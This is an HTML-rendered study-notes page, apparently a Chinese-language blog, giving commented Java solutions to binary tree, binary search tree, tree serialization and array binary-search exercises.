<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for binary tree</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">reConstructBinaryTree</span><span class="params">(<span class="type">int</span> [] pre,<span class="type">int</span> [] vin)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(pre.length!=vin.length)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(pre[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>,j=<span class="number">0</span>;i&lt;pre.length;i++)&#123;</span><br><span class="line">            <span class="comment">//首先，如果满足这个if，则说明有左子树，</span></span><br><span class="line">            <span class="comment">//所以前序遍历的两个相邻的节点就是左子树和父节点的关系</span></span><br><span class="line">            <span class="keyword">if</span>(cur.val!=vin[j])&#123;</span><br><span class="line">                cur.left = <span class="keyword">new</span> <span class="title class_">TreeNode</span>(pre[i]);</span><br><span class="line">                stack.push(cur);</span><br><span class="line">                cur = cur.left;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//就是相等了</span></span><br><span class="line">                j++;</span><br><span class="line">                <span class="comment">//栈为空表示，该子树没有左子树</span></span><br><span class="line">                <span class="comment">//寻找栈里面的元素有右节点，之前压栈的元素全是cur的祖先节点</span></span><br><span class="line">                <span class="comment">//前序遍历的下一个节点就是某个祖先节点的右孩子节点。</span></span><br><span class="line">                <span class="keyword">while</span>(!stack.isEmpty() &amp;&amp; stack.peek().val==vin[j])&#123;</span><br><span class="line">                    cur = stack.pop();</span><br><span class="line">                    j++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//java 连等是从右网左赋值的</span></span><br><span class="line">                cur.right = <span class="keyword">new</span> <span class="title class_">TreeNode</span>(pre[i]);</span><br><span class="line">                cur = cur.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h2><p>判断是否是二叉搜索树</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//如果不用指定一个前指针的话，可以使用中序遍历的到遍历结果，然后看结果是否是满足升序的</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidBST</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!isValidBST(root.left))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(pre!=<span class="literal">null</span>&amp;&amp;pre.val&gt;=root.val)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pre =root;</span><br><span class="line">        <span class="comment">//使用中序遍历</span></span><br><span class="line">        <span class="keyword">return</span> isValidBST(root.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>二叉搜索树找祖先</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        <span class="comment">//cur节点是数值在[p, q]区间中则说明该节点cur就是最近公共祖先了</span></span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//根节点的值在[p,q]的右边</span></span><br><span class="line">        <span class="keyword">if</span>(root.val&gt;p.val &amp;&amp; root.val&gt;q.val)&#123;</span><br><span class="line">           <span class="type">TreeNode</span>  <span class="variable">left</span> <span class="operator">=</span> lowestCommonAncestor(root.left,p,q);</span><br><span class="line">           <span class="keyword">if</span>(left!=<span class="literal">null</span>)&#123;</span><br><span class="line">               <span class="keyword">return</span> left;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//根节点的值在[p,q]的左边，所以需要遍历右子树</span></span><br><span class="line">        <span class="keyword">if</span>(root.val&lt;q.val &amp;&amp; root.val&lt;p.val)&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> lowestCommonAncestor(root.right,p,q);</span><br><span class="line">            <span class="keyword">if</span>(right!=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//根节点的值在[p,q]之间，可以直接返回</span></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//迭代法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        <span class="comment">//cur节点是数值在[p, q]区间中则说明该节点cur就是最近公共祖先了</span></span><br><span class="line">        <span class="keyword">while</span>(root!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(root.val&gt;p.val&amp;&amp;root.val&gt;q.val)&#123;</span><br><span class="line">                root = root.left;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(root.val&lt;p.val&amp;&amp;root.val&lt;q.val)&#123;</span><br><span class="line">                root = root.right;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> root;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>二叉搜索树插入节点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">insertIntoBST</span><span class="params">(TreeNode root, <span class="type">int</span> val)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.val&gt;val)&#123;</span><br><span class="line">            root.left = insertIntoBST(root.left,val);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            root.right = insertIntoBST(root.right,val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>二叉搜索树删除节点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">deleteNode</span><span class="params">(TreeNode root, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">        <span class="comment">//找到节点，删除节点</span></span><br><span class="line">        <span class="comment">//调整树，上移左子树最右边的节点，或者上移右子树最左边的节点</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> root,pre=<span class="literal">null</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(node!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(node.val&gt;key)&#123;</span><br><span class="line">                pre=node;</span><br><span class="line">                node = node.left;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(node.val&lt;key)&#123;</span><br><span class="line">                pre = node;</span><br><span class="line">                node = node.right;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//目标节点找父节点，</span></span><br><span class="line">        <span class="keyword">if</span>(pre==<span class="literal">null</span>)&#123;</span><br><span class="line">           <span class="keyword">return</span> deleteNode(node);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(pre.left!=<span class="literal">null</span>&amp;&amp;pre.left.val==key)&#123;</span><br><span class="line">            pre.left = deleteNode(node);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(pre.right!=<span class="literal">null</span>&amp;&amp;pre.right.val==key)&#123;</span><br><span class="line">            pre.right = deleteNode(node);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> TreeNode <span class="title function_">deleteNode</span><span class="params">(TreeNode root)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//被删除节点的右子树为空，左孩子补位</span></span><br><span class="line">        <span class="keyword">if</span>(root.right==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> root.left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//被删除节点右孩子不为空，将被删除节点的左子树移动到右孩子节点的最左节点的下面</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> root.right;</span><br><span class="line">        <span class="keyword">while</span>(node.left!=<span class="literal">null</span>)&#123;</span><br><span class="line">            node = node.left;</span><br><span class="line">        &#125;</span><br><span class="line">        node.left = root.left;</span><br><span class="line">        <span class="keyword">return</span> root.right;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="找到最近的公共祖先"><a href="#找到最近的公共祖先" class="headerlink" title="找到最近的公共祖先"></a>找到最近的公共祖先</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//就算找到了目标值，也需要遍历整个树，因为需要用到遍历的结果</span></span><br><span class="line"><span class="comment">//这里注意，如果左边没有找到为什么需要返回右边找到的哪一个</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        <span class="comment">//找到了节点</span></span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>||p==root||q==root)&#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> lowestCommonAncestor(root.left,p,q);</span><br><span class="line">         <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> lowestCommonAncestor(root.right,p,q);</span><br><span class="line">         <span class="comment">//左子树找到一个，右子树找到一个</span></span><br><span class="line">         <span class="keyword">if</span>(left!=<span class="literal">null</span>&amp;&amp;right!=<span class="literal">null</span>)&#123;</span><br><span class="line">             <span class="keyword">return</span> root;</span><br><span class="line">         &#125;<span class="keyword">else</span> <span class="keyword">if</span>(left==<span class="literal">null</span> &amp;&amp; right!=<span class="literal">null</span>)&#123;</span><br><span class="line">             <span class="comment">//左子树没有，右子树找到一个</span></span><br><span class="line">             <span class="keyword">return</span> right;</span><br><span class="line">         &#125;<span class="keyword">else</span> <span class="keyword">if</span>(left!=<span class="literal">null</span>&amp;&amp;right==<span class="literal">null</span>)&#123;</span><br><span class="line">             <span class="comment">//左子树找到一个，右子树没有</span></span><br><span class="line">             <span class="keyword">return</span> left;</span><br><span class="line">         &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="comment">//都没有找到</span></span><br><span class="line">             <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="序列化树："><a href="#序列化树：" class="headerlink" title="序列化树："></a>序列化树：</h2><blockquote>
<p>使用什么方式序列化的，就需要使用同样的方式进行反序列化</p>
</blockquote>
<h3 id="方法1：使用层次遍历"><a href="#方法1：使用层次遍历" class="headerlink" title="方法1：使用层次遍历"></a>方法1：使用层次遍历</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">public class TreeNode &#123;</span></span><br><span class="line"><span class="comment">    int val = 0;</span></span><br><span class="line"><span class="comment">    TreeNode left = null;</span></span><br><span class="line"><span class="comment">    TreeNode right = null;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    public TreeNode(int val) &#123;</span></span><br><span class="line"><span class="comment">        this.val = val;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">INF</span> <span class="operator">=</span> <span class="number">0x3f3f3f3f</span>;</span><br><span class="line">    String <span class="title function_">Serialize</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">emptyNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(INF);</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        Deque&lt;TreeNode&gt; deque = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        deque.add(root);</span><br><span class="line">        <span class="keyword">while</span>(!deque.isEmpty())&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> deque.pollFirst();</span><br><span class="line">            result.append(String.valueOf(node.val)+<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="comment">//只要该节点不是空节点，那么他的孩子节点就可以出来，至于是否是空节点需要考虑</span></span><br><span class="line">            <span class="keyword">if</span>(!node.equals(emptyNode))&#123;</span><br><span class="line">                deque.add(node.left==<span class="literal">null</span>?emptyNode:node.left);</span><br><span class="line">                deque.add(node.right==<span class="literal">null</span>?emptyNode:node.right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    TreeNode <span class="title function_">Deserialize</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(str.length()==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//根据分隔符进行分割</span></span><br><span class="line">       String[]ss = str.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span>ss.length;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(Integer.parseInt(ss[<span class="number">0</span>]));</span><br><span class="line">        Deque&lt;TreeNode&gt; deque = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        deque.add(root);</span><br><span class="line">        <span class="comment">//因为每次都是建立了两个节点，所以i需要加2</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n-<span class="number">1</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> deque.pollFirst();</span><br><span class="line">            <span class="comment">//a b分别是左孩子节点和右孩子节点</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> Integer.parseInt(ss[i]),b = Integer.parseInt(ss[i+<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">if</span>(a!=INF)&#123;</span><br><span class="line">                node.left = <span class="keyword">new</span> <span class="title class_">TreeNode</span>(a);</span><br><span class="line">                deque.add(node.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(b!=INF)&#123;</span><br><span class="line">                node.right = <span class="keyword">new</span> <span class="title class_">TreeNode</span>(b);</span><br><span class="line">                deque.add(node.right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="找到最近公共祖先节点"><a href="#找到最近公共祖先节点" class="headerlink" title="找到最近公共祖先节点"></a>找到最近公共祖先节点</h3><p>非递归</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lowestCommonAncestor</span> <span class="params">(TreeNode root, <span class="type">int</span> o1, <span class="type">int</span> o2)</span> &#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        </span><br><span class="line">        Map&lt;Integer,Integer&gt; parent = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        parent.put(root.val,-<span class="number">1</span>);</span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty()&amp;&amp;(!parent.containsKey(o1)||!parent.containsKey(o2)))&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">            <span class="keyword">if</span>(node.left!=<span class="literal">null</span>)&#123;</span><br><span class="line">                parent.put(node.left.val,node.val);</span><br><span class="line">                queue.add(node.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(node.right!=<span class="literal">null</span>)&#123;</span><br><span class="line">                parent.put(node.right.val,node.val);</span><br><span class="line">                queue.add(node.right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Set&lt;Integer&gt; ancestors = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//得到o1的所有祖先节点</span></span><br><span class="line">        <span class="keyword">while</span>(parent.containsKey(o1))&#123;</span><br><span class="line">            ancestors.add(o1);</span><br><span class="line">            o1 = parent.get(o1);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//同理</span></span><br><span class="line">        <span class="keyword">while</span>(!ancestors.contains(o2))&#123;</span><br><span class="line">            <span class="comment">//一直获取o2的祖先，直到o1的祖先里面包含了o2</span></span><br><span class="line">            o2 = parent.get(o2);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> o2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>递归</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lowestCommonAncestor</span> <span class="params">(TreeNode root, <span class="type">int</span> o1, <span class="type">int</span> o2)</span> &#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> helper(root,o1,o2).val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//查找目标节点。</span></span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">helper</span><span class="params">(TreeNode root, <span class="type">int</span> o1, <span class="type">int</span> o2)</span>&#123;</span><br><span class="line">        <span class="comment">//如果当前节点为空，或者其值为目标值中的一个，那么就返回他</span></span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>||root.val==o1||root.val==o2)&#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> helper(root.left,o1,o2);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> helper(root.right,o1,o2);</span><br><span class="line">        <span class="comment">//如果left为null则说明，这两个系欸但在root节点的右子树上，只需返回右节点</span></span><br><span class="line">        <span class="keyword">if</span>(left==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(right==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果都不为null则表示，这两个节点一个在左子树上，一个在右子树上，就直接返回当前节点就可以了</span></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>递归:主要思想是，从根节点开始递归，以当前节点作为新的根节点，查找是否目标节点的位置（在当前节点的左子树、右子树、或者一左一右），</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lowestCommonAncestor</span> <span class="params">(TreeNode root, <span class="type">int</span> o1, <span class="type">int</span> o2)</span> &#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> helper(root,o1,o2).val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//，从当前节点开始，查找目标节点。递归的主体就是当前节点，</span></span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">helper</span><span class="params">(TreeNode root, <span class="type">int</span> o1, <span class="type">int</span> o2)</span>&#123;</span><br><span class="line">        <span class="comment">//如果当前节点为空，或者其值为目标值中的一个，那么就返回他</span></span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>||root.val==o1||root.val==o2)&#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//left和right表示的是，目标节点到底在当前节点的左子树还是右子树上，是具体的哪个节点</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> helper(root.left,o1,o2);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> helper(root.right,o1,o2);</span><br><span class="line">        <span class="comment">//如果left为null则说明，这两个系欸但在root节点的右子树上，只需返回右节点</span></span><br><span class="line">        <span class="keyword">if</span>(left==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(right==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果都不为null则表示，这两个节点一个在左子树上，一个在右子树上，就直接返回当前节点就可以了</span></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>查找重复的元素</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findRepeatNumber</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] == i)&#123;</span><br><span class="line">                <span class="comment">//只有这个才能下一步</span></span><br><span class="line">                i++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(nums[nums[i]] == nums[i])&#123;</span><br><span class="line">                <span class="keyword">return</span> nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//注意交换</span></span><br><span class="line">            temp = nums[i];</span><br><span class="line">            nums[i] =  nums[temp];</span><br><span class="line">            nums[temp] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="二分查找："><a href="#二分查找：" class="headerlink" title="二分查找："></a>二分查找：</h2><p>二分查找的时候需要注意的是，有两种情况，区间表示：</p>
<ul>
<li>[left, right] <ul>
<li>则表示右端点是有效的，循环是while(left &lt;&#x3D; right)</li>
</ul>
</li>
<li>[left, right)<ul>
<li>表示右端点无效，循环是 while (left &lt; right)</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">missingNumber</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="comment">//同样使用二分查找方法来找</span></span><br><span class="line">        <span class="keyword">if</span>(nums[nums.length-<span class="number">1</span>]!=nums.length)&#123;</span><br><span class="line">            <span class="keyword">return</span> nums.length;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> left=<span class="number">0</span>,right=nums.length-<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left+right)/<span class="number">2</span>;</span><br><span class="line">        <span class="comment">//需要注意</span></span><br><span class="line">        <span class="keyword">while</span>(left&lt;=right)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid]==mid)&#123;</span><br><span class="line">                left = mid+<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                right = mid-<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            mid = (left+right)/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// if(nums[mid]==mid)&#123;</span></span><br><span class="line">        <span class="comment">//     return mid+1;</span></span><br><span class="line">        <span class="comment">// &#125;else&#123;</span></span><br><span class="line">        <span class="comment">//     return mid;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="comment">//注意二分查找结束的时候的结果，不满足条件之后，left = 右半的一个</span></span><br><span class="line">        <span class="comment">//right = 左半边的一个，所以直接返回left即可</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>二维数组二分</p>
